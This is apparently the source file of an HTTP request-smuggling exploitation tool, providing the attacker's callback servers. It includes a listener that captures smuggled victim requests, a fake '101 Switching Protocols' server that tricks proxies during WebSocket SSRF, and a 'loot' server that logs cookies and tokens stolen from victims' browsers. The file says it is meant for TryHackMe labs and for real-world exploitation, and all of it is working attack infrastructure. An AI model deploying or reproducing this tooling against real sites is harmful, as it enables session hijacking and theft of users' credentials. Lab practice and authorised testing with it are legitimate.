"""Callback servers for HTTP Smuggler exploitation.

Provides built-in listener servers for:
1. Session/request capture - receives smuggled requests with victim data
2. Fake 101 server - returns 101 Switching Protocols for WebSocket SSRF
3. Loot listener - catches exfiltrated data (cookies, tokens)

These are essential for TryHackMe labs and real-world exploitation confirmation.
"""

import asyncio
import socket
import threading
import time
from typing import Optional, List, Dict, Any, Callable
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

logger = logging.getLogger(__name__)


@dataclass
class CapturedRequest:
    """A request captured by the callback server."""
    timestamp: float
    method: str
    path: str
    headers: Dict[str, str]
    body: bytes
    source_ip: str
    source_port: int
    raw_request: bytes


@dataclass
class CallbackServerConfig:
    """Configuration for callback servers."""
    host: str = "0.0.0.0"
    port: int = 8888
    timeout: float = 60.0  # How long to wait for callbacks
    max_captures: int = 100
    log_requests: bool = True


class CaptureHandler(BaseHTTPRequestHandler):
    """HTTP handler that captures all incoming requests."""

    # Class-level storage for captured requests
    captured_requests: List[CapturedRequest] = []
    on_capture: Optional[Callable[[CapturedRequest], None]] = None

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def _capture_request(self, method: str):
        """Capture the incoming request."""
        # Read body if present
        content_length = self.headers.get('Content-Length', 0)
        body = b''
        if content_length:
            try:
                body = self.rfile.read(int(content_length))
            except Exception:
                pass

        # Build captured request
        captured = CapturedRequest(
            timestamp=time.time(),
            method=method,
            path=self.path,
            headers=dict(self.headers),
            body=body,
            source_ip=self.client_address[0],
            source_port=self.client_address[1],
            raw_request=f"{method} {self.path} HTTP/1.1\r\n".encode() +
                       str(self.headers).encode() + b"\r\n" + body,
        )

        CaptureHandler.captured_requests.append(captured)

        if CaptureHandler.on_capture:
            CaptureHandler.on_capture(captured)

        logger.info(f"Captured {method} {self.path} from {self.client_address[0]}")

        # Send response
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"Request captured")

    def do_GET(self):
        self._capture_request("GET")

    def do_POST(self):
        self._capture_request("POST")

    def do_PUT(self):
        self._capture_request("PUT")

    def do_DELETE(self):
        self._capture_request("DELETE")

    def do_OPTIONS(self):
        self._capture_request("OPTIONS")


class Fake101Handler(BaseHTTPRequestHandler):
    """HTTP handler that always returns 101 Switching Protocols.

    Used for WebSocket SSRF attacks (Method B from TryHackMe).
    When a target's SSRF endpoint connects to this server, it returns 101,
    tricking the proxy into thinking a WebSocket tunnel was established.
    """

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Return 101 Switching Protocols for any GET request."""
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.end_headers()
        logger.info(f"Sent 101 to {self.client_address[0]} - WebSocket tunnel opened")


class LootHandler(BaseHTTPRequestHandler):
    """HTTP handler for receiving exfiltrated data (cookies, tokens).

    Used for Client-Side Desync attacks where victim's browser
    sends stolen data to attacker's server.
    """

    loot: List[Dict[str, Any]] = []

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Capture exfiltrated data from query parameters."""
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        loot_entry = {
            "timestamp": time.time(),
            "path": self.path,
            "params": params,
            "headers": dict(self.headers),
            "source": f"{self.client_address[0]}:{self.client_address[1]}",
        }

        LootHandler.loot.append(loot_entry)

        # Check for common loot
        if "cookie" in params:
            logger.info(f"LOOT: Cookie captured - {params['cookie']}")
        if "token" in params:
            logger.info(f"LOOT: Token captured - {params['token']}")

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")


class CallbackServer:
    """Manages callback servers for exploitation.

    Usage:
        # Start a capture server
        server = CallbackServer(port=8888)
        server.start_capture_server()

        # Wait for captures
        captures = server.wait_for_captures(timeout=30, min_captures=1)

        # Stop server
        server.stop()
    """

    def __init__(self, config: Optional[CallbackServerConfig] = None):
        self.config = config or CallbackServerConfig()
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    def start_capture_server(
        self,
        on_capture: Optional[Callable[[CapturedRequest], None]] = None,
    ) -> bool:
        """Start the request capture server.

        Args:
            on_capture: Optional callback when request is captured

        Returns:
            True if server started successfully
        """
        CaptureHandler.captured_requests = []
        CaptureHandler.on_capture = on_capture

        return self._start_server(CaptureHandler)

    def start_fake101_server(self) -> bool:
        """Start the Fake 101 server for WebSocket SSRF.

        Returns:
            True if server started successfully
        """
        return self._start_server(Fake101Handler)

    def start_loot_server(self) -> bool:
        """Start the loot collection server.

        Returns:
            True if server started successfully
        """
        LootHandler.loot = []
        return self._start_server(LootHandler)

    def _start_server(self, handler_class) -> bool:
        """Start an HTTP server with the given handler."""
        if self._running:
            logger.warning("Server already running")
            return False

        try:
            self._server = HTTPServer(
                (self.config.host, self.config.port),
                handler_class,
            )
            self._server.socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )

            self._thread = threading.Thread(
                target=self._server.serve_forever,
                daemon=True,
            )
            self._thread.start()
            self._running = True

            logger.info(
                f"Callback server started on {self.config.host}:{self.config.port}"
            )
            return True

        except Exception as e:
            logger.error(f"Failed to start callback server: {e}")
            return False

    def stop(self):
        """Stop the callback server."""
        if self._server:
            self._server.shutdown()
            self._server = None
        self._running = False
        logger.info("Callback server stopped")

    def wait_for_captures(
        self,
        timeout: Optional[float] = None,
        min_captures: int = 1,
    ) -> List[CapturedRequest]:
        """Wait for captured requests.

        Args:
            timeout: Max time to wait (default: config timeout)
            min_captures: Minimum captures before returning

        Returns:
            List of captured requests
        """
        timeout = timeout or self.config.timeout
        start = time.time()

        while time.time() - start < timeout:
            if len(CaptureHandler.captured_requests) >= min_captures:
                return CaptureHandler.captured_requests.copy()
            time.sleep(0.1)

        return CaptureHandler.captured_requests.copy()

    def get_captures(self) -> List[CapturedRequest]:
        """Get all captured requests."""
        return CaptureHandler.captured_requests.copy()

    def get_loot(self) -> List[Dict[str, Any]]:
        """Get all captured loot."""
        return LootHandler.loot.copy()

    def clear_captures(self):
        """Clear captured requests."""
        CaptureHandler.captured_requests = []

    @property
    def is_running(self) -> bool:
        """Check if server is running."""
        return self._running

    @property
    def url(self) -> str:
        """Get the server URL."""
        return f"http://{self.config.host}:{self.config.port}"


class AsyncCallbackServer:
    """Async version of callback server using asyncio."""

    def __init__(self, config: Optional[CallbackServerConfig] = None):
        self.config = config or CallbackServerConfig()
        self._server = None
        self._captures: List[CapturedRequest] = []
        self._running = False

    async def start(self, server_type: str = "capture"):
        """Start the async callback server.

        Args:
            server_type: One of 'capture', 'fake101', 'loot'
        """
        if server_type == "capture":
            handler = self._handle_capture
        elif server_type == "fake101":
            handler = self._handle_fake101
        elif server_type == "loot":
            handler = self._handle_loot
        else:
            raise ValueError(f"Unknown server type: {server_type}")

        self._server = await asyncio.start_server(
            handler,
            self.config.host,
            self.config.port,
        )
        self._running = True

        logger.info(
            f"Async callback server ({server_type}) started on "
            f"{self.config.host}:{self.config.port}"
        )

    async def _handle_capture(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ):
        """Handle incoming connection for capture server."""
        try:
            # Read request
            data = await asyncio.wait_for(
                reader.read(8192),
                timeout=5.0,
            )

            if data:
                # Parse request line
                lines = data.split(b"\r\n")
                if lines:
                    request_line = lines[0].decode("utf-8", errors="ignore")
                    parts = request_line.split(" ")
                    method = parts[0] if parts else "UNKNOWN"
                    path = parts[1] if len(parts) > 1 else "/"

                    # Parse headers
                    headers = {}
                    for line in lines[1:]:
                        if b": " in line:
                            key, value = line.split(b": ", 1)
                            headers[key.decode()] = value.decode()

                    addr = writer.get_extra_info("peername")

                    captured = CapturedRequest(
                        timestamp=time.time(),
                        method=method,
                        path=path,
                        headers=headers,
                        body=b"",
                        source_ip=addr[0] if addr else "unknown",
                        source_port=addr[1] if addr else 0,
                        raw_request=data,
                    )
                    self._captures.append(captured)
                    logger.info(f"Captured {method} {path}")

            # Send response
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Access-Control-Allow-Origin: *\r\n"
                b"Content-Length: 8\r\n"
                b"\r\n"
                b"captured"
            )
            writer.write(response)
            await writer.drain()

        except Exception as e:
            logger.debug(f"Capture handler error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def _handle_fake101(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ):
        """Handle incoming connection for Fake 101 server."""
        try:
            # Read request (we don't really care about it)
            await asyncio.wait_for(reader.read(1024), timeout=5.0)

            # Send 101 Switching Protocols
            response = (
                b"HTTP/1.1 101 Switching Protocols\r\n"
                b"Upgrade: websocket\r\n"
                b"Connection: Upgrade\r\n"
                b"\r\n"
            )
            writer.write(response)
            await writer.drain()

            logger.info("Sent 101 Switching Protocols")

            # Keep connection open briefly
            await asyncio.sleep(1)

        except Exception as e:
            logger.debug(f"Fake101 handler error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def _handle_loot(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ):
        """Handle incoming connection for loot server."""
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=5.0)

            if data:
                # Log the loot
                logger.info(f"LOOT received: {data[:200]}")
                self._captures.append(CapturedRequest(
                    timestamp=time.time(),
                    method="LOOT",
                    path="/",
                    headers={},
                    body=data,
                    source_ip="",
                    source_port=0,
                    raw_request=data,
                ))

            # Send response
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Access-Control-Allow-Origin: *\r\n"
                b"Content-Length: 2\r\n"
                b"\r\n"
                b"ok"
            )
            writer.write(response)
            await writer.drain()

        except Exception as e:
            logger.debug(f"Loot handler error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def wait_for_captures(
        self,
        timeout: float = 30.0,
        min_captures: int = 1,
    ) -> List[CapturedRequest]:
        """Wait for captures with timeout."""
        start = time.time()

        while time.time() - start < timeout:
            if len(self._captures) >= min_captures:
                return self._captures.copy()
            await asyncio.sleep(0.1)

        return self._captures.copy()

    def get_captures(self) -> List[CapturedRequest]:
        """Get all captures."""
        return self._captures.copy()

    async def stop(self):
        """Stop the server."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        self._running = False


def get_local_ip() -> str:
    """Get the local IP address for listener configuration."""
    try:
        # Create a socket to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"
